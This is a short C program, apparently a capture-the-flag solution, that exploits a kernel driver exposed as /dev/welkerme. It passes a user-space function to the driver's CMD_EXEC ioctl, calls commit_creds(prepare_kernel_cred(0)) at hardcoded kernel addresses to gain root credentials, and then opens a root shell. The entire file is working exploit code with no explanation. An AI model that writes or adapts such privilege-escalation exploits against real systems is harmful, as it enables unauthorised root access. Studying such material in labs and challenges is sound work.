#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <unistd.h>

#define CMD_ECHO 0xc0de0001
#define CMD_EXEC 0xc0de0002

void getRoot(){
   void* (*prepare_kernel_cred)(int) = (void*)0xffffffff810726e0;
    void (*commit_creds)(void*) = (void*)0xffffffff81072540;
    commit_creds(prepare_kernel_cred(0));
}

int main(void) {
  int fd = open("/dev/welkerme",O_RDWR);
  if(fd==-1){
    perror("open");
    exit(1);
  }

  ioctl(fd, CMD_EXEC, &getRoot);
  system("/bin/sh");
  close(fd);
  return 0;
}
